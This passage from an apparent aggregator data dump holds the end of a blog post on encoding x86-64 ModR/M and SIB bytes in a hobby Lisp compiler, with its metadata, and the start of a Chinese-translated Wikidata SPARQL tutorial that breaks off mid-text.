let\u2019s go on andwrite some code.\n  While writing code, you will often need to reference  two more tables than theones we have looked at so far. These tables are Table 2-2 \u201c32-Bit AddressingForms with the ModR/M Byte\u201d (page 532) and Table 2-3 \u201c32-Bit Addressing Formswith the SIB Byte\u201d (page 533). Although the tables describe 32-bit quantities,with the REX prefix all the Es get replaced with Rs and all of a sudden theycan describe 64-bit quantities.\n These tables are super helpful when figuring out how to put together ModR/M andSIB bytes.\n   Given a register  dst and an immediate 32-bit integer  src, we\u2019re going toencode this instruction. Let\u2019s do all the steps in order.\n  Since the instruction calls for REX.W, we can keep the first line the same asbefore:\n        ModR/M bytes are where the code gets a little different. We want an abstractionto build them for us, instead of manually slinging integers like some kind ofanimal.\n To do that, we should know how they are put together. ModR/M bytes arecomprised of:\n mod (high 2 bits), which describes what big row to use in the ModR/M table\n  reg (middle 3 bits), which either describes the second register operand or an opcode extension (like  /0 above)\n  byte  modrm ( byte  mod ,  byte  rm ,  byte  reg )  {  return  (( mod  &amp;  0x3 )  &lt;&lt;  6 )  |  (( reg  &amp;  0x7 )  &lt;&lt;  3 )  |  ( rm  &amp;  0x7 ); }\n The order of the parameters is a little different than the order of the bits. Idid this because it looks a little more natural when calling the function fromits callers. Maybe I\u2019ll change it later because it\u2019s too confusing.\n  pass  0b11 (3) as  mod, because we want to move directly into a 64-bitregister, as opposed to  [reg], which means that we want to dereference thevalue in the pointer\n  void  Emit_mov_reg_imm32 ( Buffer  * buf ,  Register  dst ,  int32_t  src )  {  Buffer_write8 ( buf ,  kRexPrefix );  Buffer_write8 ( buf ,  0xc7 );  Buffer_write8 ( buf ,  modrm ( /*direct*/  3 ,  dst ,  0 ));  // ... }\n Which for the above instruction  mov rax, 100, produces a  modrm byte thathas this layout:\n                ModR/M  mod  reg  rm  11  000  direct  /0  RAX  000 I haven\u2019t put a datatype for  mods together because I don\u2019t know if I\u2019d beable to express it well. So for now I just added a comment.\n  Last, we have the immediate value. As I said above, all this entails is writingout a 32-bit quantity as we have always done:\n void  Emit_mov_reg_imm32 ( Buffer  * buf ,  Register  dst ,  int32_t  src )  {  Buffer_write8 ( buf ,  kRexPrefix );  Buffer_write8 ( buf ,  0xc7 );  Buffer_write8 ( buf ,  modrm ( /*direct*/  3 ,  dst ,  0 ));  Buffer_write32 ( buf ,  src ); }\n And there you have it! It took us 2500 words to get us to these measly fourbytes. The real success is the friends we made along the way.\n  \u201cBut Max,\u201d you say, \u201cthis produces literally the same output as before with allcases! Why go to all this trouble? What gives?\u201d\n Well, dear reader, having a mod of 3 (direct) means that there is nospecial-case escape hatch when  dst is RSP. This is unlike the other mods,where there\u2019s this  [--][--] in the table where RSP should be. That funkysymbol indicates that there must be a Scale-Index-Base (SIB) byte following theModR/M byte. This means that the overall format for this instruction shouldhave the following layout:\n            REX  Op  ModR/M        0  1      2  3      SIB  4      Disp    5 If you\u2019re trying to encode  mov [rsp-8], rax, for example, the values shouldlook like this:\n            REX  Op  ModR/M        0  1      2  3    0x48  0x89  0x44    SIB  4      Disp    5  0x24  0xf8 This is where an instruction like  Emit_store_reg_indirect ( mov [REG+disp],src) goes horribly awry with the homebrew encoding scheme I cooked up. Whenthe  dst in that instruction is RSP, it\u2019s expected that the next byte is theSIB. And when you output other data instead (say, an immediate 8-bitdisplacement), you get really funky addressing modes. Like what the heck isthis?\n  This is actual disassembled assembly that I got from running my binary codethrough  rasm2. Our compiler  definitely does not emit anything thatcomplicated, which is how I found out things were wrong.\n Okay, so it\u2019s wrong. We can\u2019t just blindly multiply and add things. So what dowe do?\n  Take a look at Table 2-2 (page 532) again. See that trying to use RSP with anysort of displacement requires the SIB.\n Now take a look at Table 2-3 (page 533) again. We\u2019ll use this to put togetherthe SIB.\n We know from Section 2.1.3 that the SIB, like the ModR/M, is comprised of threefields:\n  Intel\u2019s language is not so clear and is kind of circular. Let\u2019s take a look atsample instruction to clear things up:\n  Note that while  index and  base refer to registers,  scale refers to oneof 1, 2, 4, or 8, and  disp is some immediate value.\n This is a compact way of specifying a memory offset. It\u2019s convenient forreading from and writing to arrays and structs. It\u2019s also going to be necessaryfor us if we want to write to and read from random offsets from the stackpointer, RSP.\n   Let\u2019s start by going back to the table enumerating all the kinds of MOVinstructions (page 1209). The specific opcode we\u2019re looking for is  REX.W + 89/r, or  MOV r/m64, r64.\n     So far, so good. Looking familiar. Now that we have both the instruction prefixand the opcode, it\u2019s time to write the ModR/M byte. Our ModR/M will containthe following information:\n reg of whatever register the second operand is, since we have two registeroperands (the opcode field says  /r)\n  void  Emit_store_reg_indirect ( Buffer  * buf ,  Indirect  dst ,  Register  src )  {  Buffer_write8 ( buf ,  kRexPrefix );  Buffer_write8 ( buf ,  0x89 );  // Wrong!  Buffer_write8 ( buf ,  modrm ( /*disp8*/  1 ,  dst . reg ,  src ));  // ... }\n But no, this is wrong. As it turns out, you still have do this special thingwhen  dst.reg is RSP, as I keep mentioning. In that case,  rm must be thespecial  none value (as specified by the table). Then you also have to write aSIB byte.\n void  Emit_store_reg_indirect ( Buffer  * buf ,  Indirect  dst ,  Register  src )  {  Buffer_write8 ( buf ,  kRexPrefix );  Buffer_write8 ( buf ,  0x89 );  if  ( dst . reg  ==  kRsp )  {  Buffer_write8 ( buf ,  modrm ( /*disp8*/  1 ,  kIndexNone ,  src ));  // ...  }  else  {  Buffer_write8 ( buf ,  modrm ( /*disp8*/  1 ,  dst . reg ,  src ));  }  // ... }\n Astute readers will know that  kRsp and  kIndexNone have the same integralvalue of 4. I don\u2019t know if this was intentional on the part of the Inteldesigners. Maybe it\u2019s supposed to be like that so encoding is easier anddoesn\u2019t require a special case for both ModR/M and SIB. Maybe it\u2019scoincidental. Either way, I found it very subtle and wanted to call it outexplicitly.\n                 ModR/M  mod  reg  rm  11  100  disp8  RAX  none  000 Let\u2019s go ahead and write that SIB byte. I made a  sib helper function like modrm, with two small differences: the parameters are in order of low tohigh bit, and the parameters have their own special types instead of just being bytes.\n typedef  enum  {  Scale1  =  0 ,  Scale2 ,  Scale4 ,  Scale8 , }  Scale ; typedef  enum  {  kIndexRax  =  0 ,  kIndexRcx ,  kIndexRdx ,  kIndexRbx ,  kIndexNone ,  kIndexRbp ,  kIndexRsi ,  kIndexRdi }  Index ; byte  sib ( Register  base ,  Index  index ,  Scale  scale )  {  return  (( scale  &amp;  0x3 )  &lt;&lt;  6 )  |  (( index  &amp;  0x7 )  &lt;&lt;  3 )  |  ( base  &amp;  0x7 ); }\n I made all these datatypes to help readability, but you don\u2019t have to use themif you don\u2019t want to. The  Index one is the only one that has a small gotcha:where  kIndexRsp should be is  kIndexNone because you can\u2019t use RSP as anindex register.\n  void  Emit_store_reg_indirect ( Buffer  * buf ,  Indirect  dst ,  Register  src )  {  Buffer_write8 ( buf ,  kRexPrefix );  Buffer_write8 ( buf ,  0x89 );  if  ( dst . reg  ==  kRsp )  {  Buffer_write8 ( buf ,  modrm ( /*disp8*/  1 ,  kIndexNone ,  src ));  Buffer_write8 ( buf ,  sib ( kRsp ,  kIndexNone ,  Scale1 ));  }  else  {  Buffer_write8 ( buf ,  modrm ( /*disp8*/  1 ,  dst . reg ,  src ));  }  // ... }\n           SIB        scale  index  base  00  100  0  none  RSP  100 This is a very verbose way of saying  [rsp+DISP], but it\u2019ll do. All that\u2019sleft now is to encode that displacement. To do that, we\u2019ll just write it out:\n void  Emit_store_reg_indirect ( Buffer  * buf ,  Indirect  dst ,  Register  src )  {  Buffer_write8 ( buf ,  kRexPrefix );  Buffer_write8 ( buf ,  0x89 );  if  ( dst . reg  ==  kRsp )  {  Buffer_write8 ( buf ,  modrm ( /*disp8*/  1 ,  kIndexNone ,  src ));  Buffer_write8 ( buf ,  sib ( kRsp ,  kIndexNone ,  Scale1 ));  }  else  {  Buffer_write8 ( buf ,  modrm ( /*disp8*/  1 ,  dst . reg ,  src ));  }  Buffer_write8 ( buf ,  disp8 ( indirect . disp )); }\n Very nice. Now it\u2019s your turn to go forth and convert the rest of the assemblyfunctions in your compiler! I found it very helpful to extract the modrm/ sib/ disp8 calls into a helper function, because they\u2019re mostly thesame and very repetitive.\n  This was a very long post. The longest post in the whole series so far, even.We should probably have some concrete takeaways.\n  maybe some third thing, too, I dunno \u2014 this post was kind of a lot\n Hopefully you enjoyed it. I\u2019m going to go try and get a good night\u2019s sleep.Until next time, when we\u2019ll implement procedure calls!\n  This is a composite of all the instruction encoding diagrams present in the post. If you&#39;re seeing this text, it means your browser cannot render SVG.\n     If you are an avid reader of this blog (Do those people exist? Please reach out to me. I would love to chat.), you may notice that Tom gets pulled into shenanigans a lot. This is because Tom is the best debugger I have ever encountered, he\u2019s good at reverse engineering, and he knows a lot about low-level things. I think right now he\u2019s working on improving open-source tooling for a RISC-V board for fun. But also he\u2019s very kind and helpful and generally interested in whatever ridiculous situation I\u2019ve gotten myself into. Maybe I should add a list of the Tom Chronicles somewhere on this website. Anyway, everyone needs a Tom.\u00a0 \u21a9", "posttime": "2020-10-19 13:54:02", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u7f16\u8bd1,lisp,\u6307\u4ee4", "title": "\u7f16\u8bd1Lisp\uff1a\u6307\u4ee4\u7f16\u7801\u63d2\u66f2", "title_en": "Compiling a Lisp: Instruction encoding interlude", "transed": 1, "url": "https://bernsteinbear.com/blog/compiling-a-lisp-10/", "via": "", "real_tags": ["\u7f16\u8bd1", "lisp", "\u6307\u4ee4"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1029713, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u8df3\u8f6c\u5230\u5bfc\u822a\u8df3\u8f6c\u5230\u641c\u7d22\u7ef4\u57fa\u6570\u636e\u662f\u4e00\u4e2a\u77e5\u8bc6\u5e93\u3002\u60a8\u53ef\u4ee5\u5728\u6211\u4eec\u7684\u4ecb\u7ecd\u9875\u9762\u4e0a\u9605\u8bfb\u5173\u4e8eWikidata\u80cc\u540e\u7684\u7406\u5ff5\u548c\u6982\u5ff5\u7684\u4ecb\u7ecd\u3002\n\u7528\u6765\u95ee\u7c7b\u4f3c\u7ef4\u57fa\u6570\u636e\u95ee\u9898\u7684\u67e5\u8be2\u8bed\u8a00\u53eb\u505aSPARQL\u3002\u5982\u679c\u8fd9\u5bf9\u4f60\u6765\u8bf4\u542c\u8d77\u6765\u592a\u6280\u672f\u6027\u548c\u8fc7\u4e8e\u590d\u6742\uff0c\u522b\u62c5\u5fc3\u3002\u5bf9\u4e8e\u8fd9\u4e2a\u6e29\u548c\u7684\u4ecb\u7ecd\uff0c\u4f60\u4e0d\u5fc5\u5b66\u4e60SPARQL\u3002\u76f8\u53cd\uff0c\u6211\u4eec\u5c06\u67e5\u770b\u73b0\u6709\u793a\u4f8b\u67e5\u8be2\u4ee5\u53ca\u5982\u4f55\u7f16\u8f91\u5b83\u4eec\u3002\n\u67e5\u8be2\u662f\u8ba1\u7b97\u673a\u7cfb\u7edf\u53ef\u4ee5\u7406\u89e3\u548c\u56de\u7b54\u7684\u4e00\u79cd\u7279\u6b8a\u5f62\u5f0f\u7684\u95ee\u9898\u3002\u9664\u975e\u4f60\u4e0e\u4eba\u5de5\u667a\u80fd\u4e92\u52a8\uff0c\u5426\u5219\u4f60\u9700\u8981\u5b66\u4e60\u5982\u4f55\u4ee5\u67d0\u79cd\u65b9\u5f0f\u8868\u8fbe\u4f60\u7684\u95ee\u9898\u3002\n\u54e6\uff0c\u662f\u7684\u3002\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u4f7f\u7528Wikidata\u505a\u4efb\u4f55\u4e8b\u60c5\uff0c\u56e0\u4e3a\u6240\u6709\u6570\u636e\u90fd\u5728\u516c\u5171\u9886\u57df(CC0)\u4e2d\u3002\n\u6211\u4eec\u5c06\u4ece\u4e00\u4e2a\u7b80\u5355\u7684\u793a\u4f8b\u5f00\u59cb\uff0c\u5411\u60a8\u5c55\u793a\u5982\u4f55\u4f7f\u7528\u6b64\u670d\u52a1\uff0c\u968f\u7740\u6211\u4eec\u6784\u5efa\u66f4\u8be6\u7ec6\u7684\u793a\u4f8b\uff0c\u60a8\u5c06\u83b7\u5f97\u57fa\u672c\u95ee\u9898\u7684\u7b54\u6848\u3002\u7b54\u5e94\u6211\u3002\n\u8ba9\u6211\u4eec\u6765\u770b\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff0c\u6f14\u793a\u5982\u4f55\u83b7\u5f97\u4e16\u754c\u4e0a\u6240\u6709\u5df2\u77e5\u732b\u79d1\u52a8\u7269\u7684\u5217\u8868\u3002\n\u8fd9\u7ed9\u4e86\u6211\u4eec\u4e00\u4efd\u4e92\u8054\u7f51\u4e0a\u6240\u6709\u8457\u540d\u548c\u6076\u540d\u662d\u5f70\u7684\u732b\u7684\u540d\u5355-\u6216\u8005\u81f3\u5c11\u662f\u7ef4\u57fa\u6570\u636e\u77e5\u9053\u7684\u90a3\u4e9b\u3002\u8fd9\u5f88\u68d2\uff0c\u53ea\u8981\u4f60\u662f\u7231\u732b\u7684\u4eba\uff0c\u800c\u4e0d\u662f\uff0c\u6bd4\u5982\u8bf4\uff0c\u559c\u6b22\u72d7\u7684\u4eba\u3002\n\u5982\u679c\u60a8\u60f3\u8981\u5217\u51fa\u72d7(\u6216\u4efb\u4f55\u5176\u4ed6\u5185\u5bb9)\uff0c\u6709\u4e24\u79cd\u65b9\u6cd5\u53ef\u4ee5\u7f16\u8f91\u60a8\u7684\u67e5\u8be2\uff1a\n\u624b\u52a8\u7f16\u8f91\u67e5\u8be2\u7ef4\u57fa\u6570\u636e\u4e0a\u7684\u6bcf\u4e00\u9879\u90fd\u4f7f\u7528\u4ee3\u7801\u552f\u4e00\u6807\u8bc6\u3002\u8fd9\u4e2a\u4ee3\u7801\u662fQ146\uff0c\u4ee3\u8868\u201c\u732b\u201d\u3002\u8981\u627e\u5230\u201c\u72d7\u201d\u7684\u5bf9\u5e94\u4ee3\u7801\uff0c\u4f60\u53ef\u4ee5\u5728\u7ef4\u57fa\u6570\u636e\u4e0a\u67e5\u627e\uff1a\n\u4ece\u6253\u5f00\u7684\u7ef4\u57fa\u6570\u636e\u9875\u9762\u4e0a\u8bb0\u4e0b\u201cDog\u201d\u7684\u9879\u76ee\u7f16\u53f7(Q144)\u3002\n\u8981\u5c06\u67e5\u8be2\u4ece\u201c\u732b\u201d\u66f4\u6539\u4e3a\u201c\u72d7\u201d\uff0c\u53ea\u9700\u5728SPARQL\u67e5\u8be2\u7f16\u8f91\u5668\u4e2d\u5c06Q146\u66ff\u6362\u4e3aQ144\u3002\n\u8fd0\u884c\u8be5\u7a0b\u5e8f\uff0c\u60a8\u5c06\u770b\u5230\u4e92\u8054\u7f51\u4e0a\u6240\u6709\u6709\u540d\u548c\u81ed\u540d\u662d\u8457\u7684\u72d7\u7684\u540d\u5355\u3002\n\u73b0\u5728\uff0c\u8ba9\u6211\u4eec\u5206\u6790\u4ee3\u7801\u6765\u6982\u62ec\u8fd9\u4e00\u70b9\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u641c\u7d22\u4efb\u4f55\u5355\u4e2a\u5bf9\u8c61(\u4f8b\u5982\uff0c\u72d7\u3001\u884c\u661f\u3001\u56fd\u5bb6\u3001\u6b4c\u66f2)\uff1a\n\u9009\u62e9\u67e5\u8be2\u9009\u62e9\u67d0\u9879\u5185\u5bb9\u3002\u60a8\u8981\u9009\u62e9\u548c\u663e\u793a\u7684\u786e\u5207\u5185\u5bb9\u5c06\u5728\u7a0d\u540e\u63cf\u8ff0\uff0c\u4f46\u76ee\u524d\u60a8\u53ea\u9700\u8bf4\u660e\u5360\u4f4d\u7b26(\u6216\u53d8\u91cf)\u3002\u5728\u8fd9\u91cc\uff0c\u5b83\u4eec\u88ab\u79f0\u4e3a\u201c\u7269\u54c1\u201d\u548c\u201c\u7269\u54c1\u6807\u7b7e\u201d\u3002\u5982\u679c\u67d0\u7269\u4ee5\u95ee\u53f7\u5f00\u5934\uff0c\u5c31\u53ef\u4ee5\u770b\u51fa\u5b83\u662f\u4e00\u4e2a\u53d8\u91cf\u3002\n\u8fd9\u662f\u6211\u4eec\u8981\u627e\u7684\u5546\u54c1\u6e05\u5355\u3002\u5728\u6211\u4eec\u7684\u60c5\u51b5\u4e0b\uff0c\u90a3\u5e94\u8be5\u662f\u8457\u540d\u7684\u732b\u3002\u7ef4\u57fa\u6570\u636e\u4e0a\u7684\u9879\u76ee\u6709\u8bb8\u591a\u4e0d\u540c\u7684\u8bed\u8a00\uff0c\u51e0\u4e4e\u6709300\u79cd\u3002\u56e0\u4e3a\u6211\u4eec\u4e0d\u8ba4\u4e3a\u4e16\u754c\u4e0a\u7684\u4e00\u5207\u90fd\u662f\u82f1\u8bed\uff0c\u800c\u6240\u6709\u5176\u4ed6\u8bed\u8a00\u90fd\u53ea\u662f\u82f1\u8bed\u7684\u7279\u4f8b\uff0c\u6240\u4ee5\u7269\u54c1\u7684\u5b58\u50a8\u65b9\u5f0f\u53ef\u4ee5\u8de8\u8bed\u8a00\u5de5\u4f5c\u3002\u6bcf\u4e2a\u6982\u5ff5\u90fd\u6709\u4e00\u4e2a\u6570\u5b57\u3002Q146\u662f\u732b\u7684\u6982\u5ff5\uff0cQ64\u662f\u5fb7\u56fd\u67cf\u6797\uff0cQ42\u662f\u4f5c\u5bb6\u9053\u683c\u62c9\u65af\u00b7\u4e9a\u5f53\u65af\u7b49\u7b49\u3002\u63d0\u793a\uff1a\uff1fItem\u53ea\u662f\u4e00\u4e2a\u53d8\u91cf\u540d\uff0c\u6211\u4eec\u51b3\u5b9a\u5728\u67e5\u8be2\u4e2d\u4f7f\u7528\u5b83\u3002\u5b83\u53ef\u4ee5\u662f\u4efb\u4f55\u4e1c\u897f\uff0c\u4f8b\u5982\uff1a\uff1f\u52a8\u7269\u3002\n\u6807\u7b7e\u4eba\u7c7b\u80fd\u6bd4\u6570\u5b57\u66f4\u597d\u5730\u6d88\u5316\u4eba\u7c7b\u8bed\u8a00\u4e2d\u7684\u540d\u5b57\u3002\u6807\u7b7e\u662f\u4eba\u7c7b\u8bed\u8a00\u4e2d\u9879\u76ee\u7684\u540d\u79f0\uff0c\u4f8b\u5982\u82f1\u8bed(\u6216\u4e16\u754c\u8bed\u3001\u65e5\u8bed\u6216\u7956\u9c81\u8bed\u2026)\u3002\u3002\u6211\u4eec\u5e0c\u671b\u5728\u67e5\u8be2\u4e2d\u663e\u793a\u6807\u7b7e\uff0c\u4ee5\u4fbfQ1371145\u663e\u793a\u4e3a\u201cSOCKS\u201d(\u5c5e\u4e8eBill Clinton\u53ca\u5176\u5bb6\u4eba\u7684\u732b)\u3002\u7528\u6237\u624b\u518c\u4e2d\u6709\u5173\u6807\u7b7e\u670d\u52a1\u7684\u8be6\u7ec6\u4fe1\u606f\u3002\nWHERE{\u8fd9\u662f\u67e5\u8be2\u7684WHERE\u5b50\u53e5\u3002\u8fd9\u91cc\u6211\u4eec\u5b9a\u4e49\u5360\u4f4d\u7b26\u4e2d\u7684\u5185\u5bb9\u3002WHERE\u5b50\u53e5\u4ee5\u5de6\u5927\u62ec\u53f7\u5f00\u5934{\u4ee5\u53f3\u5927\u62ec\u53f7\u7ed3\u675f}\u3002\nWDT\uff1ap31\u8fd9\u662f\u4e3b\u8bed\u7684\u8c13\u8bed\u3002\u5982\u679c\u4f60\u5c06\u9f20\u6807\u60ac\u505c\u5728\u5b83\u4e0a\u9762\uff0c\u4f60\u4f1a\u770b\u5230\u5b83\u4ee3\u8868\u7740\u3002\nWD\uff1aQ146\u3002\u8fd9\u5c31\u662f\u76ee\u6807\u3002\u5982\u679c\u4f60\u60ac\u505c\u5728\u5b83\u4e0a\u9762\uff0c\u4f60\u4f1a\u770b\u5230\u5b83\u4ee3\u8868\u732b\u3002\n\u6240\u6709\u8fd9\u4e9b\u90fd\u662f\u76f8\u5f53\u5197\u957f\u7684\u3002\u7528\u81ea\u7136\u8bed\u8a00\u8868\u8fbe\u67e5\u8be2\u53ef\u80fd\u4f1a\u6709\u6240\u5e2e\u52a9\uff1a\n\u201c\u7ed9\u6211\u4e00\u4e2a\u9879\u76ee\u53ca\u5176\u6807\u7b7e\u7684\u5217\u8868\uff0c\u5176\u4e2d\u9879\u76ee\u662fCAT\u7684\u5b9e\u4f8b\u3002\u7136\u540e\u4e3a\u7269\u54c1\u751f\u6210\u82f1\u6587\u6807\u7b7e\u3002\u201c\u3002\n\u901a\u8fc7\u6211\u4eec\u5728\u793a\u4f8b\u4e2d\u4f7f\u7528\u7684\u4ee3\u7801\uff0c\u6211\u4eec\u5411\u60a8\u5c55\u793a\u4e86Internet\u4e0a\u6240\u6709\u6709\u540d\u548c\u6076\u540d\u7684\u732b\u7684\u5217\u8868\u3002\u4f8b\u5982\uff0c\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u66f4\u6539\u6b64\u67e5\u8be2\u4ee5\u663e\u793a\u7c7b\u4f3c\u7684\u72d7\u5217\u8868\u3002\n\u4e0b\u9762\u7684\u52a8\u753b\u5c55\u793a\u4e86\u5982\u4f55\u7528\u81ea\u7136\u8bed\u8a00\u7f16\u5199\u4e09\u5143\u7ec4\uff0c\u5e76\u5c06\u5b83\u4eec\u8f6c\u6362\u4e3aSPARQL\u67e5\u8be2\u3002\n\u5173\u952e\u662f\u7528\uff1f\u4f5c\u4e3a\u53d8\u91cf\u7684\u524d\u7f00\uff0c\u7528wd\uff1a\u4e3a\u9879\u76ee\u52a0\u524d\u7f00\uff0c\u7528wdt\uff1a\u4e3a\u5c5e\u6027\u52a0\u524d\u7f00\uff0c\u7136\u540e\u4f7f\u7528Ctrl+Space(\u6216Ctrl+Alt+Space\u6216Alt+Enter)\u952e\u76d8\u5feb\u6377\u952e\u6fc0\u6d3b\u81ea\u52a8\u5b8c\u6210\u529f\u80fd\uff0c\u8be5\u529f\u80fd\u4f1a\u7528\u5b9e\u9645\u7684Wikidata\u6807\u8bc6\u7b26\u66ff\u6362\u540e\u4e24\u8005\u3002\n\u4f7f\u7528\u6b64\u641c\u7d22\u67e5\u8be2\u5de5\u5177\uff0c\u60a8\u4e0d\u4ec5\u53ef\u4ee5\u81ea\u5b9a\u4e49\u548c\u641c\u7d22\u7b80\u5355\u6216\u805a\u5408\u3001\u590d\u5408\u3001\u5d4c\u5957\u548c\u590d\u6742\u7684\u67e5\u8be2\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528\u4efb\u4f55\u8bed\u8a00\u8fdb\u884c\u641c\u7d22\u5e76\u83b7\u5f97\u4efb\u4f55\u8bed\u8a00\u7684\u7ed3\u679c\u3002\n\u5c06\u9ed8\u8ba4\u8bed\u8a00\u4ee3\u7801\u4ece\u201cen\u201d(\u82f1\u8bed)\u66f4\u6539\u4e3a\u4efb\u4f55\u5176\u4ed6\u8bed\u8a00\u4ee3\u7801\uff0c\u4f8b\u5982\u201cja\u201d\u8868\u793a\u65e5\u8bed\u3002\n#Cats select\uff1fItem\uff1fitemLabel\u5176\u4e2d{\uff1fItem wdt\uff1ap31 wd\uff1aq146.\u3002\u670d\u52a1\u7ef4\u57fa\uff1aLabel{bd\uff1aserviceParam wikibase\uff1alanguage&#34\uff1bja&#34\uff1b}}\u3002\n\u5728\u754c\u9762\u4e2d\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u66f4\u6539\u663e\u793a\u9879\u76ee\u7684\u987a\u5e8f\u3002\u53ea\u9700\u5355\u51fb\u641c\u7d22\u7ed3\u679c\u7684\u76f8\u5173\u5217\u5373\u53ef\u81ea\u5b9a\u4e49\u6392\u5e8f\u987a\u5e8f\uff1a\n\u5230\u76ee\u524d\u4e3a\u6b62\uff0c\u6211\u4eec\u5df2\u7ecf\u770b\u5230\u67e5\u8be2\u7684\u8f93\u51fa\u663e\u793a\u4e3a\u8868\u3002\u8ba9\u6211\u4eec\u5c1d\u8bd5\u4e00\u4e9b\u56fe\u7247\uff1a\n\u5355\u51fb\u201c\u793a\u4f8b\u201d\u6309\u94ae\u5e76\u9009\u62e9\u201c\u66f4\u591a\u7684\u732b\uff0c\u5e26\u56fe\u7247\u201d\u793a\u4f8b\u3002\u8fd0\u884c\u67e5\u8be2\uff0c\u5e94\u8be5\u4f1a\u5728\u5c4f\u5e55\u7684\u4e0b\u534a\u90e8\u5206\u5f39\u51faCAT\u56fe\u50cf\u3002\n\u8fd9\u5c31\u662f\u5c06\u7ed3\u679c\u663e\u793a\u4e3a\u56fe\u50cf\u800c\u4e0d\u662f\u8868\u683c\u7684\u65b9\u5f0f\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528\u7ed3\u679c\u53f3\u4e0b\u89d2\u7684\u201c\u663e\u793a\u201d\u83dc\u5355\u624b\u52a8\u5207\u6362\u6570\u636e\u7684\u663e\u793a\u65b9\u5f0f\u3002\u5c1d\u8bd5\u5c06\u83dc\u5355\u5207\u6362\u5230\u201c\u8868\u201d\uff0c\u4ee5\u4fbf\u5728\u8868\u89c6\u56fe\u4e2d\u67e5\u770b\u76f8\u540c\u7684\u7ed3\u679c\u3002\n\u8ba9\u6211\u4eec\u6765\u770b\u770b\u8be5\u67e5\u8be2\u4e0e\u4e0a\u4e00\u7ae0\u4e2d\u7684\u67e5\u8be2\u76f8\u6bd4\u6709\u54ea\u4e9b\u65b0\u529f\u80fd\u3002\u7528\u901a\u4fd7\u6613\u61c2\u7684\u82f1\u8bed\u5199\uff0c\u67e5\u8be2\u5e94\u8be5\u662f\u201c\u7ed9\u6211\u6240\u6709\u4e0e\u732b\u6709\u5173\u7684\u7269\u54c1\u3002\u8fd8\u8981\u7ed9\u6211\u6bcf\u4ef6\u5546\u54c1\u7684\u56fe\u7247\u3002\u987a\u4fbf\u8bf4\u4e00\u4e0b\uff0c\u5c06\u7ed3\u679c\u663e\u793a\u4e3a\u56fe\u50cf\u7f51\u683c\uff0c\u800c\u4e0d\u662f\u8868\u683c\u3002\u201c\n#defaultView\uff1aImageGrid\u770b\u8d77\u6765\u50cf\u662f\u6ce8\u91ca\uff0c\u5b9e\u9645\u4e0a\u662f\u5c06\u67e5\u8be2\u7ed3\u679c\u663e\u793a\u4e3a\u56fe\u50cf\u800c\u4e0d\u662f\u8868\u683c\u7684\u6307\u4ee4\u3002\n\uff1fx1\u8fd9\u610f\u5473\u7740\u6211\u4eec\u67e5\u8be2\u4efb\u4f55\u8c13\u8bcd\uff0c\u800c\u4e0d\u4ec5\u4ec5\u662f\u201cis a instance of\u201d\u3002\u60f3\u60f3\u201c\u63cf\u8ff0\u201d(\u7b2c180\u9875)\u6216\u201c\u4ee5\u6b64\u547d\u540d\u201d(\u7b2c138\u9875)\u8fd9\u6837\u7684\u8c13\u8bcd\u3002\u6211\u4eec\u6ca1\u6709\u5728\u67e5\u8be2\u4e2d\u7684\u5176\u4ed6\u4efb\u4f55\u5730\u65b9\u4f7f\u7528\uff1fX1\uff0c\u8fd9\u610f\u5473\u7740\u5360\u4f4d\u7b26\u4ee3\u8868\u201c\u6211\u4e0d\u5728\u4e4e\u8c13\u8bcd\u662f\u4ec0\u4e48\uff0c\u7ed9\u6211\u6240\u6709\u4ee5\u732b\u4e3a\u4e3b\u8bed\u7684\u7ed3\u679c\u201d\n\u53ef\u9009\u5728\u5927\u62ec\u53f7\u5185\uff0c\u60a8\u53ef\u4ee5\u770b\u5230\u53e6\u4e00\u6761\u8bed\u53e5\uff0c\u8be5\u8bed\u53e5\u5c06\u53ef\u9009\u6570\u636e\u6dfb\u52a0\u5230\u7ed3\u679c\u4e2d\u3002\u5360\u4f4d\u7b26\uff1f\u9879\u88ab\u91cd\u7528\uff0c\u5e76\u4e0e\u8c13\u8bcdP18(\u8868\u793a\u201c(HAS)image\u201d\u548c\u65b0\u7684\u5360\u4f4d\u7b26\uff1fpic.\u3002\u4f7f\u7528\u53ef\u9009\u5bf9\u8bed\u53e5\u8fdb\u884c\u5305\u88c5\u610f\u5473\u7740\u9879\u4e0d\u4e00\u5b9a\u8981\u6709P18\u8c13\u8bcd\u624d\u80fd\u663e\u793a\u5728\u5217\u8868\u4e2d\uff0c\u5e76\u4e14\uff1fic\u5360\u4f4d\u7b26\u53ef\u4ee5\u662f\u7a7a\u7684\u3002\n\u5bfb\u627e\u72d7\u800c\u4e0d\u662f\u732b\u3002\u63d0\u793a\uff1a\u66f4\u6539WHERE\u4e2d\u7b2c\u4e00\u6761\u8bed\u53e5\u7684\u5bf9\u8c61\u90e8\u5206\u3002\n\u53ea\u5c55\u793a\u201c\u63cf\u7ed8\u201d\u732b\u7684\u7269\u54c1(\u4f60\u4f1a\u5f97\u5230\u753b)\u3002\u63d0\u793a\uff1a\u7528\u5176\u4ed6\u4ee3\u7801\u66ff\u6362\uff1fx1\u3002\n\u8fd8\u6709\u5176\u4ed6\u65b9\u6cd5\u53ef\u4ee5\u663e\u793a\u60a8\u7684\u6570\u636e\uff0c\u4f46\u5e76\u4e0d\u662f\u6240\u6709\u7684\u65b9\u6cd5\u90fd\u9002\u7528\uff0c\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u83dc\u5355\u4e2d\u6709\u4e9b\u4f1a\u7070\u663e\u7684\u539f\u56e0\u3002\u53ea\u6709\u5f53\u7ed3\u679c\u6570\u636e\u5b9e\u9645\u5305\u542b\u56fe\u50cfURL\u65f6\uff0c\u201c\u56fe\u50cf\u6620\u5c04\u201d\u624d\u662f\u53ef\u9009\u7684\u3002\u5728\u4ee5\u4e0b\u7ae0\u8282\u4e4b\u4e00\u4e2d\uff0c\u60a8\u5c06\u5b66\u4e60\u5982\u4f55\u5c06\u9879\u76ee\u663e\u793a\u4e3a\u5730\u56fe\u4e0a\u7684\u70b9\u3002\n\u5982\u